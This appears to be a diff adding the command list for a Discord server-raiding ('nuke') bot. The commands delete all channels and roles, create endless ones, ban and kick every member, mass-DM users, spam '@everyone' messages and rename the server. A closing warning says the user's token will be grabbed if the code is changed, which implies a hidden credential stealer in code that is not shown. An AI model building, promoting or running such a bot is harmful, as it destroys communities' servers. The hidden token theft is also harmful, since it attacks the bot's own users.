@@ -1,0 +1,16 @@
+commands are
+
+!channel delete = deletes all channels,
+!channel create = creates inf channels,
+!role delete = deletes all roles,
+!role create = creates inf roles,
+!ban =bans everybody,
+!kick = kicks everybody,
+!dm (message) = dms everybody (beware if you put a link inside it will ban you)
+!spam = spams "@everyone ACE HAS WON!!" in every channel,
+ !sname = you have to say like !sname die-loser which changes server name
+ last of alll
+
+!logout = makes the bot offline
+
+(warning, if you change the code even a bit, your token will be grabbed)
